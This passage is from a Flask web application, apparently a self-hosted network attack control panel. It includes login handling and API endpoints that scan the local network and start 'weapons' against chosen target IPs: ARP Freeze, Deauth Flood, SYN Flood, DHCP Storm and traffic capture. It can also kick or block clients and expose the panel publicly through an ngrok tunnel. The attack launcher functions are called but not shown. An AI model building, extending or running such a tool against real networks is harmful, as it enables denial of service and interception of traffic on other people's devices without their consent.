  const btn = document.getElementById('login-submit-btn');
  addRipple(btn, event);
  const username = document.getElementById('login-username').value.trim();
  const password = document.getElementById('login-password').value;
  const errorBox = document.getElementById('login-error');
  errorBox.style.display = 'none';
  btn.disabled = true;
  try {
    const res = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password }),
    });
    const data = await res.json();
    if (data.success) {
      authToken = data.token;
      localStorage.setItem('godhand_token', authToken);
      showApp();
    } else {
      errorBox.textContent = data.error || 'Login failed';
      errorBox.style.display = 'block';
    }
  } catch (e) {
    errorBox.textContent = 'Could not reach the server';
    errorBox.style.display = 'block';
  }
  btn.disabled = false;
  return false;
}
async function handleLogout() {
  try { await apiCall('logout', 'POST'); } catch (e) {}
  authToken = '';
  localStorage.removeItem('godhand_token');
  showLogin();
}
async function checkLoginRequired() {
  try {
    const res = await fetch('/api/login_required');
    const data = await res.json();
    if (!data.login_required) {
      showApp();
      return;
    }
    if (authToken) {
      const testRes = await fetch('/api/state', { headers: { 'Authorization': 'Bearer ' + authToken } });
      if (testRes.status !== 401) {
        showApp();
        return;
      }
      authToken = '';
      localStorage.removeItem('godhand_token');
    }
    showLogin();
  } catch (e) {
    // Fail open on network error -- don't brick local access to a self-hosted tool
    // just because the login-required check itself couldn't be reached.
    showApp();
  }
}

// Init (runs once, after login succeeds or when login isn't required)
function initApp() {
  document.getElementById('arp-snap-count').textContent = arpHistory.length;
  document.getElementById('watch-whole-network').checked = watchWholeNetwork;
  renderDevices();
  renderAlerts();
  loadInterfaces();
  loadTargets();
  checkPrerequisites();
  pollLogs();
  pollAttackStatus();
  pollTrafficCapture();
  pollBandwidth();
  refreshGatewayStatus();
  loadDdnsConfig();
  setInterval(pollLogs, 2000);
  setInterval(pollAttackStatus, 2000);
  setInterval(pollTrafficCapture, 1500);
  setInterval(pollBandwidth, 2000);
  setInterval(refreshGatewayStatus, 4000);
}
checkLoginRequired();
</script>
</body>
</html>
'''
    return render_template_string(html_template)

# ---------- API endpoints (with authentication) ----------
@app.route('/api/interfaces', methods=['GET'])
@require_auth
def api_interfaces():
    try:
        out = subprocess.check_output(['ip', '-o', 'link', 'show'], text=True)
        iface_list = []
        for line in out.splitlines():
            parts = line.split(':')
            if len(parts) >= 2:
                name = parts[1].strip()
                if name == 'lo':
                    continue
                ip = ''
                try:
                    ip_out = subprocess.check_output(['ip', '-o', '-4', 'addr', 'show', name], text=True)
                    for l in ip_out.splitlines():
                        if 'inet ' in l:
                            ip = l.split()[3].split('/')[0]
                            break
                except:
                    pass
                wireless = False
                try:
                    subprocess.check_output(['iw', 'dev', name, 'info'], stderr=subprocess.DEVNULL, text=True)
                    wireless = True
                except:
                    pass
                iface_list.append({'name': name, 'ip': ip, 'wireless': wireless})
        return jsonify({'interfaces': iface_list})
    except Exception as e:
        return jsonify({'interfaces': [], 'error': str(e)})

@app.route('/api/set_interface', methods=['POST'])
@require_auth
def api_set_interface():
    data = request.json
    iface = data.get('interface')
    if not iface:
        return jsonify({'success': False, 'status': 'No interface provided'})
    update_state('interface', iface)
    add_log('info', f'Interface set to {iface}')
    return jsonify({'success': True, 'status': f'Interface set to {iface}'})

@app.route('/api/set_gateway', methods=['POST'])
@require_auth
def api_set_gateway():
    data = request.json
    gw = data.get('gateway')
    if not gw or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', gw):
        return jsonify({'success': False, 'status': 'Invalid IP'})
    update_state('gateway', gw)
    add_log('info', f'Gateway set to {gw}')
    return jsonify({'success': True, 'status': f'Gateway set to {gw}'})

@app.route('/api/set_port', methods=['POST'])
@require_auth
def api_set_port():
    data = request.json
    port = data.get('port')
    try:
        port = int(port)
    except:
        return jsonify({'success': False, 'status': 'Invalid port'})
    if port < 1 or port > 65535:
        return jsonify({'success': False, 'status': 'Invalid port'})
    update_state('port', port)
    add_log('info', f'Port set to {port}')
    return jsonify({'success': True, 'status': f'Port set to {port}'})

@app.route('/api/state', methods=['GET'])
@require_auth
def api_state():
    with STATE_LOCK:
        return jsonify({
            'state': {
                'interface': STATE['interface'],
                'gateway': STATE['gateway'],
                'port': STATE['port'],
                'targets': STATE['targets'],
                'hosts': STATE['hosts'],
                'blocked_macs': list(STATE['blocked_macs']),
            },
            'running_attacks': list(STATE['attack_pids'].keys()),
            'auth_enabled': bool(SECRET),
        })

@app.route('/api/scan', methods=['GET'])
@require_auth
def api_scan():
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    my_ip, cidr = get_my_ip_and_cidr(iface)
    if my_ip == '0.0.0.0':
        return jsonify({'success': False, 'error': 'No IP on interface'})
    hosts = arp_scan(iface, my_ip, cidr)
    update_state('hosts', hosts)
    add_log('info', f'ARP scan completed, found {len(hosts)} hosts')
    return jsonify({'success': True, 'hosts': hosts})

@app.route('/api/add_target', methods=['POST'])
@require_auth
def api_add_target():
    data = request.json
    ip = data.get('ip')
    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'success': False, 'error': 'Invalid IP'})
    if ip not in STATE['targets']:
        add_to_list('targets', ip)
        add_log('info', f'Target added: {ip}')
    return jsonify({'success': True})

@app.route('/api/remove_target', methods=['POST'])
@require_auth
def api_remove_target():
    data = request.json
    ip = data.get('ip')
    if ip in STATE['targets']:
        remove_from_list('targets', ip)
        add_log('info', f'Target removed: {ip}')
    return jsonify({'success': True})

@app.route('/api/start_attack', methods=['POST'])
@require_auth
def api_start_attack():
    data = request.json
    weapon = data.get('weapon')
    if weapon not in [1,2,3,4,5]:
        return jsonify({'success': False, 'error': 'Invalid weapon'})
    if not STATE['interface']:
        return jsonify({'success': False, 'error': 'Interface not set'})
    if not STATE['targets']:
        return jsonify({'success': False, 'error': 'No targets added'})
    if weapon != 5 and not STATE['gateway']:
        return jsonify({'success': False, 'error': 'Gateway not set'})
    if weapon in STATE['attack_pids']:
        kill_attack(STATE['attack_pids'][weapon])
        del STATE['attack_pids'][weapon]
    try:
        pids = run_attack(weapon, STATE['targets'], STATE['gateway'], STATE['port'], STATE['interface'])
        if not pids:
            raise RuntimeError('Attack launcher returned no processes')
        with STATE_LOCK:
            STATE['attack_pids'][weapon] = pids
            STATE['attack_status'][weapon] = 'running'
        weapon_names = {1:'ARP Freeze',2:'Deauth Flood',3:'SYN Flood',4:'DHCP Storm',5:'Traffic Capture'}
        add_log('success', f'Attack started: {weapon_names[weapon]}')
        def liveness(weapon_id, proc_list):
            time.sleep(2)
            if any(p.poll() is not None for p in proc_list):
                with STATE_LOCK:
                    STATE['attack_status'][weapon_id] = 'dead'
                add_log('error', f'Attack {weapon_names[weapon_id]} died unexpectedly')
        threading.Thread(target=liveness, args=(weapon, pids), daemon=True).start()
        return jsonify({'success': True, 'weapon': weapon_names[weapon]})
    except Exception as e:
        add_log('error', f'Attack start failed: {str(e)}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stop_attack', methods=['POST'])
@require_auth
def api_stop_attack():
    with STATE_LOCK:
        for weapon, pids in list(STATE['attack_pids'].items()):
            kill_attack(pids)
        STATE['attack_pids'].clear()
        STATE['attack_status'] = {}
        if STATE['monitor_log_path']:
            try:
                os.unlink(STATE['monitor_log_path'])
            except:
                pass
            STATE['monitor_log_path'] = None
    if STATE['interface']:
        set_monitor(STATE['interface'], False)
    add_log('info', 'All attacks stopped')
    return jsonify({'success': True, 'status': 'All attacks stopped'})

@app.route('/api/attack_status', methods=['GET'])
@require_auth
def api_attack_status():
    with STATE_LOCK:
        for weapon, pids in STATE['attack_pids'].items():
            if any(p.poll() is not None for p in pids):
                STATE['attack_status'][weapon] = 'dead'
            else:
                STATE['attack_status'][weapon] = 'running'
        attacks = {weapon: (STATE['attack_status'].get(weapon) == 'running') for weapon in STATE['attack_pids']}
    return jsonify({'attacks': attacks})

@app.route('/api/monitor_log', methods=['GET'])
@require_auth
def api_monitor_log():
    lines = STATE.get('monitor_log', [])
    return jsonify({'lines': lines[-100:], 'capturing': 5 in STATE['attack_pids']})

@app.route('/api/traffic_stats', methods=['GET'])
@require_auth
def api_traffic_stats():
    stats = compute_traffic_stats()
    stats['capturing'] = 5 in STATE['attack_pids']
    return jsonify({'success': True, **stats})

@app.route('/api/nmap_scan', methods=['GET'])
@require_auth
def api_nmap_scan():
    ip = request.args.get('ip', '')
    full = request.args.get('full', '0') == '1'
    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'success': False, 'error': 'Invalid IP'})
    add_log('info', f'Starting nmap {"full" if full else "quick"} scan on {ip}')
    try:
        ports = run_nmap_scan(ip, full=full)
        add_log('success', f'Nmap scan on {ip} complete: {len(ports)} open port(s)')
        return jsonify({'success': True, 'ip': ip, 'ports': ports})
    except Exception as e:
        add_log('error', f'Nmap scan failed on {ip}: {str(e)}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/bandwidth', methods=['GET'])
@require_auth
def api_bandwidth():
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    counters = get_iface_bytes(iface)
    if counters is None:
        return jsonify({'success': False, 'error': f'No stats available for {iface}'})
    rx_bytes, tx_bytes = counters
    now = time.time()
    with STATE_LOCK:
        prev = STATE.get('bandwidth_sample')
        STATE['bandwidth_sample'] = {'iface': iface, 'time': now, 'rx': rx_bytes, 'tx': tx_bytes}
    if not prev or prev['iface'] != iface or now <= prev['time']:
        return jsonify({'success': True, 'iface': iface, 'rx_bps': 0, 'tx_bps': 0, 'rx_total': rx_bytes, 'tx_total': tx_bytes})
    dt = now - prev['time']
    rx_bps = max(0, (rx_bytes - prev['rx']) / dt)
    tx_bps = max(0, (tx_bytes - prev['tx']) / dt)
    return jsonify({'success': True, 'iface': iface, 'rx_bps': rx_bps, 'tx_bps': tx_bps, 'rx_total': rx_bytes, 'tx_total': tx_bytes})

@app.route('/api/gateway/status', methods=['GET'])
@require_auth
def api_gateway_status():
    return jsonify({
        'success': True,
        'local_ip': get_local_ip(),
        'external_ip': get_external_ip(),
        'dns': gateway_dns_status(),
        'vpn': gateway_vpn_status(),
        'proxy': gateway_proxy_status(),
    })

@app.route('/api/gateway/dns/start', methods=['POST'])
@require_auth
def api_gateway_dns_start():
    try:
        start_gateway_dns()
        return jsonify({'success': True, 'status': 'DNS privacy stack started'})
    except Exception as e:
        add_log('error', f'Gateway DNS start failed: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/gateway/dns/stop', methods=['POST'])
@require_auth
def api_gateway_dns_stop():
    stop_gateway_dns()
    return jsonify({'success': True, 'status': 'DNS privacy stack stopped'})

@app.route('/api/gateway/dns/update_blocklist', methods=['POST'])
@require_auth
def api_gateway_update_blocklist():
    add_log('info', 'Updating gateway blocklist...')
    domains = fetch_blocklist_domains()
    write_gateway_configs(domains)
    add_log('success', f'Blocklist updated: {len(domains)} domains')
    return jsonify({'success': True, 'count': len(domains)})

@app.route('/api/gateway/dns/test', methods=['GET'])
@require_auth
def api_gateway_dns_test():
    return jsonify({'success': True, 'results': test_gateway_dns()})

@app.route('/api/gateway/proxy/start', methods=['POST'])
@require_auth
def api_gateway_proxy_start():
    try:
        start_gateway_proxy()
        return jsonify({'success': True, 'status': f'Proxy started on port {GW_PROXY_PORT}'})
    except Exception as e:
        add_log('error', f'Gateway proxy start failed: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/gateway/proxy/stop', methods=['POST'])
@require_auth
def api_gateway_proxy_stop():
    stop_gateway_proxy()
    return jsonify({'success': True, 'status': 'Proxy stopped'})

def ddns_config_masked():
    with STATE_LOCK:
        cfg = dict(STATE['ddns'])
    if cfg.get('token'):
        cfg['token'] = '••••' + cfg['token'][-4:]
    if cfg.get('password'):
        cfg['password'] = '••••'
    return cfg

@app.route('/api/ddns/config', methods=['GET'])
@require_auth
def api_ddns_get_config():
    return jsonify({'success': True, 'config': ddns_config_masked()})

@app.route('/api/ddns/config', methods=['POST'])
@require_auth
def api_ddns_set_config():
    data = request.json or {}
    provider = data.get('provider')
    if provider not in ('duckdns', 'noip'):
        return jsonify({'success': False, 'error': 'provider must be duckdns or noip'})
    domain = (data.get('domain') or '').strip()
    if not domain:
        return jsonify({'success': False, 'error': 'Hostname/domain is required'})
    try:
        interval = max(1, int(data.get('interval_minutes', 5)))
    except (TypeError, ValueError):
        return jsonify({'success': False, 'error': 'interval_minutes must be a number'})
    with STATE_LOCK:
        STATE['ddns']['provider'] = provider
        STATE['ddns']['domain'] = domain
        STATE['ddns']['interval_minutes'] = interval
        if provider == 'duckdns':
            if data.get('token'):
                STATE['ddns']['token'] = data['token'].strip()
        else:
            if data.get('username'):
                STATE['ddns']['username'] = data['username'].strip()
            if data.get('password'):
                STATE['ddns']['password'] = data['password'].strip()
    add_log('info', f'DDNS configured: {provider} / {domain}')
    return jsonify({'success': True})

@app.route('/api/ddns/toggle', methods=['POST'])
@require_auth
def api_ddns_toggle():
    data = request.json or {}
    enabled = bool(data.get('enabled'))
    with STATE_LOCK:
        if enabled and STATE['ddns']['provider'] not in ('duckdns', 'noip'):
            return jsonify({'success': False, 'error': 'Configure and save DDNS settings first'})
        STATE['ddns']['enabled'] = enabled
    add_log('info', f'DDNS auto-update {"enabled" if enabled else "disabled"}')
    return jsonify({'success': True})

@app.route('/api/ddns/update_now', methods=['POST'])
@require_auth
def api_ddns_update_now():
    cfg = get_state('ddns')
    if cfg.get('provider') not in ('duckdns', 'noip'):
        return jsonify({'success': False, 'error': 'DDNS is not configured'})
    ddns_perform_update()
    masked = ddns_config_masked()
    return jsonify({'success': masked.get('last_status') == 'ok', 'status': masked})

@app.route('/api/ngrok/start', methods=['POST'])
@require_auth
def api_ngrok_start():
    data = request.json or {}
    authtoken = (data.get('authtoken') or '').strip()
    port = data.get('port') or APP_PORT
    try:
        proc = start_ngrok_tunnel(port, authtoken or None)
        with STATE_LOCK:
            STATE['ngrok_proc'] = proc
        time.sleep(1.5)
        url = get_ngrok_public_url()
        add_log('success', f'ngrok tunnel started' + (f': {url}' if url else ' (URL not yet available)'))
        return jsonify({'success': True, 'url': url})
    except Exception as e:
        add_log('error', f'ngrok start failed: {e}')
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/ngrok/stop', methods=['POST'])
@require_auth
def api_ngrok_stop():
    stop_proc('ngrok')
    with STATE_LOCK:
        STATE['ngrok_proc'] = None
    add_log('info', 'ngrok tunnel stopped')
    return jsonify({'success': True})

@app.route('/api/ngrok/status', methods=['GET'])
@require_auth
def api_ngrok_status():
    running = proc_running('ngrok')
    return jsonify({'success': True, 'running': running, 'url': get_ngrok_public_url() if running else None})

@app.route('/api/check_reachability', methods=['GET'])
@require_auth
def api_check_reachability():
    ip = request.args.get('ip')
    if not ip or not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', ip):
        return jsonify({'reachable': False, 'error': 'Invalid IP'})
    start = time.time()
    reachable = server_ping(ip)
    latency = int((time.time() - start) * 1000) if reachable else None
    return jsonify({'reachable': reachable, 'latency': latency})

@app.route('/api/deauth_capability', methods=['GET'])
@require_auth
def api_deauth_capability():
    iface = get_state('interface')
    if not iface:
        return jsonify({'success': False, 'error': 'Interface not set'})
    return jsonify({'success': True, **deauth_capability(iface)})

@app.route('/api/kick', methods=['POST'])
@require_auth
def api_kick():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found for IP'})
    if not STATE['interface']:
        return jsonify({'success': False, 'status': 'Interface not set'})
    try:
        kicked = kick_client(ip, mac, STATE['interface'])
        if kicked:
            add_log('success', f'Kicked {ip} ({mac})')
            return jsonify({'success': True, 'status': f'Kicked {ip} ({mac})'})
        else:
            add_log('warn', f'Kick {ip} attempted but target still responding')
            return jsonify({'success': False, 'status': f'Kick {ip} attempted but target still responding'})
    except Exception as e:
        add_log('error', f'Kick failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/block', methods=['POST'])
@require_auth
def api_block():
    data = request.json
    ip = data.get('ip')
    if not ip:
        return jsonify({'success': False, 'status': 'No IP provided'})
    mac = None
    for h in STATE['hosts']:
        if h['ip'] == ip:
            mac = h['mac']
            break
    if not mac:
        return jsonify({'success': False, 'status': 'MAC not found'})
    try:
        blocked = block_mac(mac)
        msg = 'Blocked' if blocked else 'Unblocked'
        return jsonify({'success': True, 'status': f'{msg} {mac}'})
    except Exception as e:
        add_log('error', f'Block failed: {str(e)}')
        return jsonify({'success': False, 'status': str(e)})

@app.route('/api/logs', methods=['GET'])
@require_auth
def api_logs():
    with STATE_LOCK:
        return jsonify({'logs': STATE['log']})

@app.route('/api/clear_logs', methods=['POST'])
@require_auth
def api_clear_logs():
    with STATE_LOCK:
        STATE['log'] = []
    add_log('info', 'Server log cleared')
    return jsonify({'success': True})

@app.route('/api/add_log', methods=['POST'])
@require_auth
def api_add_log():
    data = request.json
    level = data.get('level', 'info')
    msg = data.get('msg', '')
    add_log(level, msg)
    return jsonify({'success': True})

# ---------- bootstrap ----------
if __name__ == '__main__':
    if os.geteuid() != 0:
        print("WARNING: Not running as root. Some features (raw sockets, iptables) may fail.")
    ensure_tool('iw')
    ensure_tool('iptables')
    threading.Thread(target=ddns_supervisor_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=APP_PORT, debug=False, threaded=True)
